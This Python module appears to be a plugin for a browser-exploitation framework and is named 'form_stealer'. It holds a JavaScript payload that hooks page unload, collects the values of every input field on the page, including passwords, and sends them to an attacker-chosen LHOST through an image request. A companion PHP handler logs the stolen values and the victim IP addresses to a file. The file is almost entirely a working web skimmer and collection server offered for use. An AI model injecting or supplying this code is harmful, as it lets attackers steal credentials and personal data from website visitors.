#!/usr/bin/python3.7
import socket
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "N/A"
name="form_stealer"
description="Steals all the values set in forms and sends them away through an image src"
options = [["LHOST", "Host to send captured strokes to", local_ip()]] 
handler_options = [["LOGFILE", "File to store logged data", "session_klog.txt"]]

payload = """
document.getElementsByTagName("body")[0].setAttribute("onunload","postData()");

function postData() {

        var output = "page="+document.location;
        var inputs, index;

        inputs = document.getElementsByTagName('input');
        for (index = 0; index < inputs.length; ++index) {
                input_name = inputs[index].id || inputs[index].name;
                output = output + "&" + input_name + "=" + inputs[index].value;
        }

        output = encodeURI(output);
        new Image().src = "http://LHOST:8000/handler.php?"+output;

}"""

handler = """
<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$header_line = sprintf("\n[*] %s (host: %s)", $_GET["page"], $ip);
$f=fopen("LOGFILE","a+");
fwrite($f, $header_line);
fclose($f);
foreach($_GET as $key => $value){
    if ($key == "page"){} else {
        $form_line = sprintf("\nName: %s Value: %s", $key, $value);
    }
    $f=fopen("LOGFILE","a+");
    fwrite($f, $form_line);
    fclose($f);
}
?>
"""
